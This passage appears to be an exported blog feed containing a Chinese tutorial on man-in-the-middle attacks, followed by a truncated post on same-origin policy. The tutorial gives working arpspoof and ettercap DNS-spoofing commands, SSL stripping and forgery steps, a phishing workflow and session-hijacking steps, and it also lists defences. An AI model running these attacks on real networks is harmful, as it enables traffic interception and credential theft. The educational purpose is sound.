    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>中间人攻击(man-in-the-middle attack, abbreviated to MITM)，简单的讲，就是黑客悄悄的躲在通信双方之间，窃听甚至篡改通信信息。而通信双方并不知道消息已经被截获甚至篡改了。</p><p>举个例子，小明用微信发一条消息给小红，这条消息会从小明的手机发送到微信的服务器，再由微信服务器转发给小红，理论上讲，微信服务器是可以查看或者修改小明发送的信息的。这个时候，微信服务器就可以是实施攻击的中间人。<br><img src="/2019/11/12/中间人攻击/1572860932811.png" alt="Alt text"></p><p>wiki百科上也有一个生动的例子：</p><blockquote><p>假设爱丽丝（Alice）希望与鲍伯（Bob）通信。同时，马洛里（Mallory）希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。</p></blockquote><blockquote><p>首先，爱丽丝会向鲍勃索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的公钥（而不是鲍伯的）。<br>爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。<br>我们的身份就是Mallory，我们希望欺骗Alice和Bob，让其认为我们是交互的正确目标，从而来获取他们之间交流的信息。<br><img src="/2019/11/12/中间人攻击/1572861192084.png" alt="Alt text"></p></blockquote><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><ol><li>数据包嗅探<br> 1) 明文嗅探<br> 2) 借助中间人代理进行密文嗅探</li><li>数据注入<br> 1) CRIME中在数据包中注入javascript代码实现攻击目的</li><li>数据流量劫持<br> 1) 使用iptables工具对数据包的IP地址进行强制重定向</li><li>数据包篡改<br> 1) DNS劫持中篡改DNS返回数据包的IP地址，达到DNS劫持的目的<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2></li></ol><h3 id="0x00-ARP投毒"><a href="#0x00-ARP投毒" class="headerlink" title="0x00 ARP投毒"></a>0x00 ARP投毒</h3><h4 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h4><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><p>以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p><h4 id="ARP欺骗的三种方式"><a href="#ARP欺骗的三种方式" class="headerlink" title="ARP欺骗的三种方式"></a>ARP欺骗的三种方式</h4><blockquote><ol><li>攻击者仅仅欺骗被攻击主机(单向):<br>主机C向主机B发送伪造的ARP回应包，声称自己的MAC地址就是网关对应的IP，这样，主机B就会将所有的流量发送主机C(攻击者)，主机C开启ip_forward路由转发功能将数据包进行转发</li></ol></blockquote><blockquote><ol start="2"><li>攻击者仅仅欺骗被攻击主机、同时在本地进行Iptable NAT转发(双向)<br>主机C向主机B发送伪造的ARP回应包，声称自己的MAC地址就是网关对应的IP，这样，主机B就会将所有的流量发送主机C(攻击者)，同时，攻击者在本地使用Iptables进行NAT转换，这样就可以<br>接收到网关返回的数据包，完成双向流量窃取的目的</li></ol></blockquote><blockquote><ol start="3"><li>攻击者同时欺骗被攻击主机和网关(双向)<br>主机C同时欺骗主机B和网关，实现数据中转，并监听到所有主机B的数据(双向)<br>主机C向网关发送ARP回应包，声称自己是主机B，同时向主机B发送ARP回应包，声称自己是网关，这样，网关和主机B两边的流量都会发往主机C，主机C并不需要使用Iptables做特殊的转发，只需要打开ip_forward路由开关(即打开转发功能)，是主机C具有数据包转发的功能即可，就可以成功劫持主机B的流量数据</li></ol></blockquote><h4 id="1-主机C冒充网关欺骗主机B"><a href="#1-主机C冒充网关欺骗主机B" class="headerlink" title="1.主机C冒充网关欺骗主机B"></a>1.主机C冒充网关欺骗主机B</h4><p><img src="/2019/11/12/中间人攻击/1572920755954.png" alt="Alt text"><br>可以看到，攻击者只污染了受攻击主机的ARP缓存表，所以受攻击主机的原本发往网关的数据包都会发送到攻击者的主机中，但是网关的ARP表是正常的，网关会根据当前数据包的目的IP地址(受攻击主机的IP地址)进行正确的ARP解析，从而将数据包发送到受攻击主机上。</p><p>这种方式的直接后果就是我们只能窃取到受攻击主机的”外发数据包”，无法接收到从远程服务端返回的”返回数据包”，自然也就无法进行流量内容修改、流量注入的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 开启端口转发，允许本机像路由器那样转发数据包</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">2. ARP投毒，向主机B声称自己(攻击者)就是网关</span><br><span class="line">arpspoof -h</span><br><span class="line">Usage: arpspoof [-i interface] [-t target] host</span><br><span class="line">arpspoof -i eth0 -t 192.168.159.132 192.168.159.2 </span><br><span class="line">(192.168.159.132是我们的攻击目标、192.168.159.2是网关IP地址)</span><br></pre></td></tr></table></figure><p>攻击的原理是攻击者不断向受攻击目标(192.168.159.132)发送”ARP回应包”，声称自己就是网关，因为ARP机制没有身份验证，所以受攻击目标会把接收到的ARP回应包保存进自己的ARP缓存中，从而达到ARP污染的目的。</p><h4 id="2-攻击者仅仅欺骗被攻击主机、同时在本地进行Iptable-NAT转发-双向"><a href="#2-攻击者仅仅欺骗被攻击主机、同时在本地进行Iptable-NAT转发-双向" class="headerlink" title="2. 攻击者仅仅欺骗被攻击主机、同时在本地进行Iptable NAT转发(双向)"></a>2. 攻击者仅仅欺骗被攻击主机、同时在本地进行Iptable NAT转发(双向)</h4><p><img src="/2019/11/12/中间人攻击/1572922032030.png" alt="Alt text"><br>从图中可以看到，由于使用了NAT技术，从服务端返回的数据包也会经过攻击者的主机了，这样，攻击者就可以在本地进行流量内容的修改、流量注入了</p><h4 id="3-攻击者同时欺骗被攻击主机和网关-双向"><a href="#3-攻击者同时欺骗被攻击主机和网关-双向" class="headerlink" title="3. 攻击者同时欺骗被攻击主机和网关(双向)"></a>3. 攻击者同时欺骗被攻击主机和网关(双向)</h4><p><img src="/2019/11/12/中间人攻击/1572922134977.png" alt="Alt text"><br>在双向ARP欺骗中，攻击者仅仅充当了一个”数据包路由转发”的角色，将两个方向的数据包都进行转发</p><h4 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h4><p>(1)如何清空B中的ARP Table？不然它一查询，直接发包给网关。</p><blockquote><p>ARP Table采用老化机制，某一行一段时间不用就被删除，提速。<br>hacker大量发ARP包产生大量ARP通信量使通络堵塞，A就找不到B，A必然会发ARP Request包问：B是谁，<br>此时hacker的伪造包，也就改变了A中的ARP Table。</p></blockquote><p>(2)如何保证在网关前响应B的请求查询？</p><blockquote><p>因为(1)中已经提到，局域网中充斥着大量hacker伪造B的ARP响应包，B竞争不过hacker，所以hacker会比B更快响应</p></blockquote><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>上述三种方式从本质上来说是一样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">网络数据包的通信是通过MAC地址来连接的，数据包只会根据MAC进行点对点的发送和接收</span><br><span class="line">为了解决跨局域网、跨域发送的问题，所以有了IP层，IP负责对数据包进行路由</span><br><span class="line">数据包在发送的过程中，MAC会在不同的&quot;跳&quot;中变化，而源、目的IP地址是不会变的，它负责路由的功能</span><br><span class="line">我们在设置网卡参数的网关GetWay时填写的IP，其实只是为了获取网关的MAC而存在的，默认网关也因此得名，即当我们发送的目的IP不在当前局域网范围内，这个数据包就会被发送网关(即目的MAC地址填写网关的MAC地址)</span><br></pre></td></tr></table></figure></p><h3 id="0x01-SSL证书伪造"><a href="#0x01-SSL证书伪造" class="headerlink" title="0x01 SSL证书伪造"></a>0x01 SSL证书伪造</h3><p>SSL通信原理：<a href="http://www.cnblogs.com/LittleHann/p/3733469.html" target="_blank" rel="external">http://www.cnblogs.com/LittleHann/p/3733469.html</a><br>攻击思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者对目标客户端和网关发送ARP投毒攻击，污染它们的ARP缓存表</span><br><span class="line">2. 客户端在浏览器中输入&quot;https://mail.google.com/&quot;的网址，浏览器会尝试和&quot;https://mail.google.com/&quot;的443端口建立SSL连接，但是因为客户端受到了ARP投毒攻击，原本发往</span><br><span class="line">网关的数据包被发往了攻击者的主机</span><br><span class="line">3. 攻击者在本机使用iptables将接收到的443目的端口的数据包重定向到本机的IP地址</span><br><span class="line">4. 这样，受攻击者客户端的浏览器就只会和攻击者主机进行SSL连接</span><br><span class="line">5. 攻击者在本机使用监听443端口，并且伪造一个假的SSL证书，用于和客户端的连接，同时，提取客户端发送的数据包的原始目的IP地址，用于和客户端原始请求的服务器建立另一个SSL连接</span><br><span class="line">6. 中间人攻击者在双向的SSL Socket通信都建立完成后，对两边的socket进行数据读写同步，将数据通道打通，使客户端的浏览器能够正常访问(受攻击者不会察觉到已经收到SSL中间人攻击)</span><br><span class="line">7. 在数据同步的同时，记录下明文数据，达到SSL中间人攻击的目的</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/12/中间人攻击/1572923445097.png" alt="Alt text"></p><h3 id="0x02-SSL卸载攻击"><a href="#0x02-SSL卸载攻击" class="headerlink" title="0x02 SSL卸载攻击"></a>0x02 SSL卸载攻击</h3><p>攻击思路：</p><ol><li>ARP欺骗，使得攻击者能截获所有目标主机的网络流量</li><li>攻击者利用用户对于地址栏中HTTPS与HTTP的疏忽，将所有的HTTPS连接都用HTTP来代替</li><li>同时，与目标服务器建立正常的HTTPS连接</li><li>由于HTTP通信是明文传输，攻击者能轻松实施嗅探</li><li>受攻击客户端与原始请求服务器之间的全部通信经过了代理转发。 </li><li>其中，出现的图标被替换成为用户熟悉的”小黄锁”图标，以建立信任。 </li><li>这样，中间人攻击就成功骗取了密码、账号等信息，而受害者一无所知</li></ol><p>产生原因：</p><blockquote><ol><li>大部分使用SSL的网站并非”全站加密”，仅对部分重要的网页使用SSL，这就给攻击者以可乘之机。可以简单地理解为:<br>网站在普通页面、非机密页面都是采用HTTP方式访问的，而在进入登录页面的时候才会采用HTTPS加密处理</li><li>大多数网站为了保证用户习惯的兼容性，都同时支持HTTP、HTTPS的访问，大多数情况下，这两种访问方式并没有太大的安全问题，但是当用户访问的页面是涉及机密信息的登录页面时，<br>服务端往往会采用”重定向”的方式，”强制”用户的浏览器以HTTPS的方式来访问登录页面，为的是保证密钥信息的安全传输</li></ol></blockquote><p>其中原因(2)是我们能够利用SSLStrip发动攻击的关键，服务端为了”强制”用户以HTTPS方式进行登录，会向浏览器返回重定向数据包，即”302 Moved Temporarily”，正常情况下，浏览器收到这个数据包之后，就会重新使用新的URL发起一个新的HTTPS连接。</p><p>而SSLStrip就是盯准了这个时机，当发现浏览器试图加密即采用https传输数据时，它就适时的介入中间，充当代理作用，然后主机认为安全会话开始，这是上文中的被动加密的提示就不会出现了，SSLstrip也通过https连接了安全服务器。那么所有用户到SSLstrip的连接时http，所有的传输数据就能被拦截。<br><img src="/2019/11/12/中间人攻击/1572924620793.png" alt="Alt text"></p><h3 id="0x03-基于中间人攻击的SSL-BEAST攻击"><a href="#0x03-基于中间人攻击的SSL-BEAST攻击" class="headerlink" title="0x03 基于中间人攻击的SSL BEAST攻击"></a>0x03 基于中间人攻击的SSL BEAST攻击</h3><p>攻击原理：</p><blockquote><ol><li>SSL/TLS中使用”记录协议数据包”来封装上层的应用数据</li><li>SSL/TLS使用CBC加密模式进行分组对称加密，并且不同”记录协议数据包”之间并不是独立的IV，不同的数据包之间形成一个整体的CBC模式</li><li>中间人攻击者可以在返回流量中注入javascript代码，根据攻击者已知的IV和Ciper，来穷举出下一个数据包中包含的cookie信息</li></ol></blockquote><p>相关链接：<br><a href="http://blog.ivanristic.com/2011/10/mitigating-the-beast-attack-on-tls.html" target="_blank" rel="external">http://blog.ivanristic.com/2011/10/mitigating-the-beast-attack-on-tls.html</a><br><a href="http://blog.csdn.net/jimmyleeee/article/details/7029435" target="_blank" rel="external">http://blog.csdn.net/jimmyleeee/article/details/7029435</a><br><a href="http://www.butian.org/server/2543.html" target="_blank" rel="external">http://www.butian.org/server/2543.html</a><br><a href="http://www.educatedguesswork.org/2011/09/security_impact_of_the_rizzodu.html" target="_blank" rel="external">http://www.educatedguesswork.org/2011/09/security_impact_of_the_rizzodu.html</a><br><a href="http://www.freebuf.com/articles/web/5636.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/5636.html</a></p><h3 id="0x04-基于中间人攻击的DNS劫持"><a href="#0x04-基于中间人攻击的DNS劫持" class="headerlink" title="0x04 基于中间人攻击的DNS劫持"></a>0x04 基于中间人攻击的DNS劫持</h3><blockquote><p>DNS劫持是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能反应或访问的是假网址。</p></blockquote><p>属于数据包篡改的一种。用自己的伪造的IP冒名顶替正常的DNS服务器的IP，让受攻击者访问到你的服务器。</p><p>攻击思路：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. ARP投毒，进行中间人攻击劫持流量 </span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward </span><br><span class="line">arpspoof -i eth0 -t 192.168.159.132 192.168.159.137  </span><br><span class="line">arpspoof -i eth0 -t 192.168.159.137 192.168.159.132  </span><br><span class="line">2. 使用ettercap的dns_spoof插件进行DNS劫持</span><br><span class="line">locate etter.dns </span><br><span class="line">vim /usr/local/share/ettercap/etter.dns</span><br><span class="line">添加一个你需要劫持的URL的IP记录</span><br><span class="line">www.jnrain.com   A    192.168.159.254</span><br><span class="line">www.jnrain.com   PTR  192.168.159.254</span><br><span class="line">启动ettercap插件</span><br><span class="line">ettercap -i eth0 -T -P dns_spoof  </span><br><span class="line">3. 客户端访问指定URL，返回的是攻击者指定的IP，达到DNS劫持的目的</span><br></pre></td></tr></table></figure><p>相关链接：<a href="https://www.freebuf.com/articles/system/5265.html" target="_blank" rel="external">https://www.freebuf.com/articles/system/5265.html</a></p><h3 id="0x05-基于DNS劫持的SET社会工程钓鱼攻击"><a href="#0x05-基于DNS劫持的SET社会工程钓鱼攻击" class="headerlink" title="0x05 基于DNS劫持的SET社会工程钓鱼攻击"></a>0x05 基于DNS劫持的SET社会工程钓鱼攻击</h3><p>在完成DNS劫持之后，作为攻击者我们可以控制用户访问某个URL时实际访问的IP地址。我们可以以此为基础进行钓鱼攻击。</p><p>攻击思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 发送中间人攻击，劫持目标客户端流量</span><br><span class="line">2. 进行DNS劫持，将&quot;http://www.jnrain.com&quot;这个URL劫持到攻击者所在的本机上</span><br><span class="line">3. 目标客户端在访问&quot;http://www.jnrain.com&quot;的时候实际访问的是攻击者所在的服务器</span><br><span class="line">4. 攻击者在本机服务器上搭建一个钓鱼页面，对&quot;http://www.jnrain.com&quot;进行高度仿真，并加入记录密码的代码</span><br><span class="line">5. 通过钓鱼页面直接获取目标客户端的帐号、密码</span><br></pre></td></tr></table></figure></p><p>SET工具套件提供了一个基础的社工平台，它提供了一些基本功能，例如”网页克隆”、”钓鱼邮件发送”等<br><a href="https://github.com/trustedsec/social-engineer-toolkit/" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit/</a><br><a href="http://www.freebuf.com/tools/7841.html" target="_blank" rel="external">http://www.freebuf.com/tools/7841.html</a></p><p>一个内网下的钓鱼案例：<a href="https://mp.weixin.qq.com/s/J7h4pB2r1BmbgQqBOS28IQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/J7h4pB2r1BmbgQqBOS28IQ</a></p><h3 id="0x06-基于中间人攻击的会话劫持攻击-Session-Hajacking"><a href="#0x06-基于中间人攻击的会话劫持攻击-Session-Hajacking" class="headerlink" title="0x06 基于中间人攻击的会话劫持攻击(Session Hajacking)"></a>0x06 基于中间人攻击的会话劫持攻击(Session Hajacking)</h3><p>发送这种攻击方式的一个根本原因是”当前的HTTP环境采用Cookie当作一种连接状态的标识符”，即服务端根据Cookie来识别当前登录用户的身份，基本上来说，我们在访问一个购物网站的时候，浏览器和服务器的交互过程是这样的</p><ol><li>用户第一次访问这个网站，网站服务端产生一个session，并将这个session的ID值保存在cookie值中，写入客户端</li><li>客户端在之后的每次访问这个网站的同一个域下的页面时都会带上这个cookie值，</li><li>服务端根据cookie中的sessionID来映射对应的session，从而得到当前用户的登录状态</li><li>这样，借助cookie的机制，HTTP协议从某种程度上来说，就成为了一个有状态的协议</li></ol><p>对攻击者来说，如果能获取到这个Cookie值，等于也就获取了对应用户的”身份令牌”，即可以不需要帐号、密码就以目标用户的身份合法的登录网站(XSS攻击也是这个目的)</p><p>“基于中间人攻击的会话劫持”属于前面说的”数据包流量嗅探”类别，它的思路如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者对目标客户端发送中间人攻击，劫持流量</span><br><span class="line">2. 使用ferret抓取WEB通信流量包</span><br><span class="line">3. 使用hamster对抓取的数据包进行重组、分析，得出包含cookie信息的HTTP包</span><br><span class="line">4. 攻击者使用hamster组合出的HTTP包进行重放，以目标用户的身份登录目标网站，达到会话劫持</span><br></pre></td></tr></table></figure><h2 id="案例拓展"><a href="#案例拓展" class="headerlink" title="案例拓展"></a>案例拓展</h2><p><a href="https://xz.aliyun.com/t/3596" target="_blank" rel="external">利用域名碰撞实现从任何地方发起中间人攻击</a><br><a href="https://www.freebuf.com/articles/wireless/188383.html" target="_blank" rel="external">如何通过中间人攻击嗅探SIM卡的流量通信</a><br><a href="https://www.t00ls.net/articles-26723.html" target="_blank" rel="external">BT5 + wireshark玩wifi捕获和中间人攻击</a><br><a href="https://xz.aliyun.com/t/217" target="_blank" rel="external">基于MitM的RDP降级攻击</a><br><a href="https://www.4hou.com/info/news/5223.html" target="_blank" rel="external">WSUS MITM远程攻击实战全过程详解</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/system/5265.html" target="_blank" rel="external">中间人攻击-DNS欺骗</a><br><a href="https://www.anquanke.com/post/id/151762#h2-18" target="_blank" rel="external">浅谈Arp攻击和利用Arp欺骗进行MITM</a><br><a href="https://elliotsomething.github.io/2016/12/22/HTTPS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1/" target="_blank" rel="external">HTTPS中间人攻击及防御</a><br><a href="https://www.freebuf.com/column/205786.html" target="_blank" rel="external">MITM——SSL篇</a><br><a href="https://blog.csdn.net/emaste_r/article/details/17241567" target="_blank" rel="external">初探MITM-中间人攻击</a><br><a href="https://www.cnblogs.com/littlehann/p/3735602.html#_lab2_1_0" target="_blank" rel="external">中间人攻击(MITM)姿势总结</a></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>我们常常提到HTTPS使用了SSL/TLS加密协议，是一种非常安全的WEB通信机制，这句话从某种角度来说是对的。我觉得更准备地应该说是针对传统的明文嗅探进行了有效的防御。但同时，我们应该认识到，安全技术、攻击方式往往在不同的场景、组合不同的技术可以形成多种多样的业务架构，而安全问题往往就发生在这些新出现的业务架构中。在一些特定的前提、特定的触发条件下，一些看似传统的攻击方式能够形成新的攻击向量。</p><h3 id="几种防御技术"><a href="#几种防御技术" class="headerlink" title="几种防御技术"></a>几种防御技术</h3><ol><li>公钥基础建设PKI：在PKI方案中，主要防御中间人攻击的方案就是PKI的相互认证的机制。使用这样的机制并由应用程序验证用户，用户设备验证应用程序。但在某些流氓应用的情况下，这不是很有用，所以需要注意对流氓软件应与正规软件进行区分。</li><li>更强力的相互认证</li></ol><ul><li>密钥（通常是高信息熵的密钥，从而更安全）</li><li>密码（通常是低的信息熵的密钥，从而降低安全性）</li></ul><ol start="3"><li>延迟测试：例如使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</li><li>使用其他形式的密钥交换形式</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;中间人攻击(man-in-the-middle attack, abbreviated to MITM)，简单的讲，就是黑客悄悄的躲在通信双
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://www.twosmi1e.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="中间人攻击" scheme="https://www.twosmi1e.com/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>同源策略那些事</title>
    <link href="https://www.twosmi1e.com/2019/11/05/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>https://www.twosmi1e.com/2019/11/05/同源策略那些事/</id>
    <published>2019-11-05T07:34:09.000Z</published>
    <updated>2019-11-05T07:43:48.063Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于<a href="https://xz.aliyun.com/t/6614" target="_blank" rel="external">先知社区</a>,转载请注明来源。</p><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h3 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h3><p> 同源策略(Same Origin Policy)是一种约定，是浏览器最基本也是最核心的安全功能。可以说Web是构建在同源策略的一种实现。</p><p><strong>浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。</strong><br>SOP影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。</p><h3 id="判断是否同源"><a href="#判断是否同源" class="headerlink" title="判断是否同源"></a>判断是否同源</h3><p>影响源的因素：</p><ul><li>HOST</li><li>域名或IP地址</li><li>子域名</li><li>端口</li><li>协议</li></ul><p>文件所在域不重要，重要的是文件解析加载所在的域。</p><table><thead><tr><th style="text-align:center">URL</th><th style="text-align:center">Outcome</th><th style="text-align:center">Reason</th></tr></thead><tbody><tr><td style="text-align:center"><a href="http://blog.twosmi1e.com/dir2/test.html" target="_blank" rel="external">http://blog.twosmi1e.com/dir2/test.html</a></td><td style="text-align:center">success</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a href="http://blog.twosmi1e.com/dir/inner/index.html" target="_blank" rel="external">http://blog.twosmi1e.com/dir/inner/index.html</a></td><td style="text-align:center">success</td><td style="text-align:center"></td></tr><tr><td style="text-align:center"><a href="https://blog.twosmi1e.com/secure.html" target="_blank" rel="external">https://blog.twosmi1e.com/secure.html</a></td><td style="text-align:center">failure</td><td style="text-align:center">diffrent protocol</td></tr><tr><td style="text-align:center"><a href="http://blog.twosmi1e.com:90/dir2/etc.html" target="_blank" rel="external">http://blog.twosmi1e.com:90/dir2/etc.html</a></td><td style="text-align:center">failure</td><td style="text-align:center">diffrent port</td></tr><tr><td style="text-align:center"><a href="http://code.twosmi1e.com/dir/other.html" target="_blank" rel="external">http://code.twosmi1e.com/dir/other.html</a></td><td style="text-align:center">failure</td><td style="text-align:center">diffrent host</td></tr></tbody></table><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><h3 id="业务环境中一些跨域场景"><a href="#业务环境中一些跨域场景" class="headerlink" title="业务环境中一些跨域场景"></a>业务环境中一些跨域场景</h3><ol><li>比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。</li><li>程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。</li><li>电商网站想通过用户浏览器加载第三方快递网站的物流信息。</li><li>子站域名希望调用主站域名的用户资料接口，并将数据显示出来。</li></ol><h3 id="跨域方法"><a href="#跨域方法" class="headerlink" title="跨域方法"></a>跨域方法</h3><h4 id="HTML标签"><a href="#HTML标签" class="headerlink" title="HTML标签"></a>HTML标签</h4><p><code>&lt;script&gt; &lt;img&gt; &lt;iframe&gt; &lt;link&gt;</code>等带<code>src</code>属性的标签都可以跨域加载资源，而不受同源策略的限制。<br>每次加载时都会由浏览器发送一次GET请求，通过<code>src</code>属性加载的资源，浏览器会限制JavaScript的权限，使其不能读写返回的内容。</p><p>常见标签：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;...&quot;&gt;</span><br><span class="line">&lt;video src=&quot;...&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;audio src=&quot;...&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;embed src=&quot;...&quot;&gt;</span><br><span class="line">&lt;frame src=&quot;...&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</span><br><span class="line">&lt;applet code=&quot;...&quot;&gt;&lt;/applet&gt;</span><br><span class="line">&lt;object data=&quot;...&quot; &gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure></p><p>在CSS中，<code>@font-face</code>可以引入跨域字体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">@font-face &#123;</span><br><span class="line">src: url(&quot;http://developer.mozilla.org/@api/deki/files/2934/=VeraSeBd.ttf&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><h4 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h4><p>同一主域不同子域之间默认不同源，但可以设置<code>document.domain</code>为相同的高级域名来使不同子域同源。</p><p><code>document.domain</code>只能向上设置更高级的域名，需要载入<code>iframe</code>来相互操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//父域的运行环境是http://localhost:9092/</span><br><span class="line">//同样在部署在同一台服务器上的不同端口的应用也是适用的</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;http://localhost:9093/b.php&quot; id=&quot;iframepage&quot; width=&quot;100%&quot; height=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;yes&quot; onLoad=&quot;getData&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.parentDate = &#123;</span><br><span class="line">        &quot;name&quot;: &quot;hello world!&quot;,</span><br><span class="line">        &quot;age&quot;: 18</span><br><span class="line">    &#125;</span><br><span class="line">    /**</span><br><span class="line">     * 使用document.domain解决iframe父子模块跨域的问题</span><br><span class="line">     */</span><br><span class="line">    let parentDomain = window.location.hostname;</span><br><span class="line">    console.log(&quot;domain&quot;,parentDomain); //localhost</span><br><span class="line">    document.domain = parentDomain;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 